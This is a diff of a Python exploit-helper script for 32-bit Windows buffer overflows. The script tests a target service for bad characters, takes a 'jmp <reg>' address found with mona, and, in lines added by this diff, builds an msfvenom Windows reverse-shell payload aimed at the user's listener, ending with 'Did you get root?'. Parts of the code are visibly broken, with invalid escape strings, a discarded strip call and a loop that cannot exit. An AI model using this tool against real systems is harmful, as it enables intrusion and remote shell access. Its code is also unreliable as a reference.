@@ -29,12 +29,13 @@ bad_chars = (                                               # Bad character set 
     "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
     "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
     "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
-hex_namespace = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
 
 
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('-i', '--ip', help='Target IP Address', default='BLANK', type=str, required=True)
+    parser.add_argument('-li', '--local_ip', help='Target IP Address', default='BLANK', type=str, required=True)
+    parser.add_argument('-lp', '--local_port', help='Target Port', default=110, type=int, required=True)
     parser.add_argument('-p', '--port', help='Target Port', default=110, type=int, required=True)
     parser.add_argument('-c', '--char_length', help='Character Length:6000', nargs='?', type=str, required=True)
     arguments = parser.parse_args()
@@ -258,39 +259,39 @@ def loop_bad_char_test(_payload, _ip, _port):
     print(f'{_delimiter}Payload Result:\n[Expected]:\tfail\n[Actual]:\t{result}\n\n')
     msg0 = f'[?] Did you identify a bad hex character? (\'y\' for yes, \'n\' for no, \'q\' to quit)\n'
     msg1 = f'[?] Enter the identified hex character (Ex. Enter \'0a\' for \'0x0a\')\n\'n\' for no\n\'q\' to quit\n'
+    msg2 = f'[?] Did you identify another bad hex character? (\'y\' for yes, \'n\' for no, \'q\' to quit)\n'
     response = input(msg0).lower()
     if response == 'q':
         exit(0)
     elif response == 'n':
         pass
+        continue_msg()
     while response != 'y' and response != 'n' and response != 'q':
         response = input(msg0).lower()
     while response == 'y':
         kb_chars = ', '.join(_known_bad_chars)
         bad_char = input(f'[i] Current KB Hex Characters:\t{kb_chars}\n{msg1}')
-        while len(bad_char) != 2:
-            print(f'Please enter only one hex value at a time (i.e. \'0a\' for \'0x0a\')\n')
-            bad_char = interactive_sanitize(input(msg1), msg1, 'alnum')
-            bad_char = interactive_sanitize(bad_char, msg1, 'hex')
-        bad_char = interactive_sanitize(bad_char, msg1, 'alnum')
+        while len(bad_char) != 4:
+            print(f'Please enter only one hex value at a time (i.e. \'\\x0a\' for \'0x0a\')\n')
+            bad_char = interactive_sanitize(input(msg1), msg1, 'hex')
         bad_char = interactive_sanitize(bad_char, msg1, 'hex')
-        bad_char = f'\x{bad_char}'
         bad_chars.strip(bad_char)
         if bad_char not in _known_bad_chars:
             _known_bad_chars.append(bad_char)
             kb_chars = ', '.join(_known_bad_chars)
-            print(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
-        while bad_char in _known_bad_chars:
-            print(f'Please try again. The \'{bad_char}\' hex string has already been reported.\n')
-            print(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
-        response = input(msg0).lower()
+            continue_msg()
+            response = input(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg2}')
+        elif bad_char in _known_bad_chars:
+            while bad_char in _known_bad_chars:
+                print(f'Please try again. The \'{bad_char}\' hex string has already been reported.\n')
+                response = input(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
+            continue_msg()
 
 
 def main():
     global _delimiter
     global _current_step
     global _known_bad_chars
-    global hex_namespace
     global bad_chars
     global payload
     global ip
@@ -299,6 +300,8 @@ def main():
     args = parse_args()
     ip = args.ip
     port = args.port
+    local_ip = args.local_ip
+    local_port = args.local_port
     char_length = args.char_length                                              # Defaults to 6000
     msg = f'The char_length value provided ({char_length}) is not an int. Enter another value for this variable.\n'
     char_length = interactive_sanitize(char_length, msg, 'int')
@@ -390,23 +393,40 @@ def main():
     # ****************************************************************************************
     # Loop through bad chars test, storing bad_chars for filtering our future payload.
     # ****************************************************************************************
-    # Here, we need to loop through the bad chars test with full interaction with the user and store bad ones
     update_instruction_msg()
     loop_bad_char_test(payload, ip, port)
-    # Use the Reboot or restart service function here in a loop until explicit continue from user.
 
     # ****************************************************************************************
-    # Find target Register's JMP Call (ex. JMP ESP)
+    # Find target Register's JMP Call (ex. JMP ESP) and generate the payload
     # ****************************************************************************************
     update_instruction_msg()
-    msg = f'You now must find a good \'jump esp\' command and note the offset that will land us reliably into the ' \
-          f'\'C\' part of the previously defined buffer. This should be the ESP buffer and note that we cannot ' \
-          f'simply pass the address of \'jmp esp\' to EIP as it changes from crash to crash, but the pointer does not.'
-    print(msg)
+    msg = f'You now must find an address containing \'jump <reg>\' using `!mona` from within Immunity.\n Enter ' \
+          f'the target candidate address now. (\'7cb79e3f\' for \'0x7cb79e3f\')\n'
+    instr_address = input(msg).lower()
+    if len(instr_address) != 8:
+        while len(instr_address) != 8:
+            print(f'{_delimiter}Error{_delimiter}Provided Memory Address is not of proper length. Please enter '
+                  f'a valid hex memory address.')
+            instr_address = input(msg).lower()
+    instr_address = interactive_sanitize(instr_address, msg, 'hex')
+    x = endian_reverse(instr_address)
+    le_instr_address = f'\x{x[3:4]}\x{x[2:3]}\x{x[1:2]}\x{x[0:1]}'
     get_elapsed_time(start_time, 'loud')
-    # Good post for guidance: https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/
-
-    # 10/03/2020: Project Status: Incomplete (~30% remaining)
+    sys_command = f'msfvenom --payload windows/shell_reverse_tcp LHOST={local_ip} LPORT={local_port} ' \
+                  f'EXITFUNC=thread -f c -a x86 --platform windows -b {"".join(_known_bad_chars)}'
+    continue_msg()
+    msg = f'{_delimiter}Alert!{_delimiter}Ensure that you are listening on port {local_port}!\n(Enter \'c\' to ' \
+          f'continue, \'q\' to quit.\n'
+    success = input(msg)
+    while success != 'q' and success != 'c':
+        print(f'Incorrect Value. Enter \'c\' to continue, \'q\' to quit.\n')
+        success = input(msg)
+        if success == 'q':
+            exit(0)
+        elif success == 'c':
+            break
+    execute_command(sys_command)
+    print(f'{_delimiter}Did you get root? If not, start over from the beginning.{_delimiter}')
 
 
 if __name__ == "__main__":
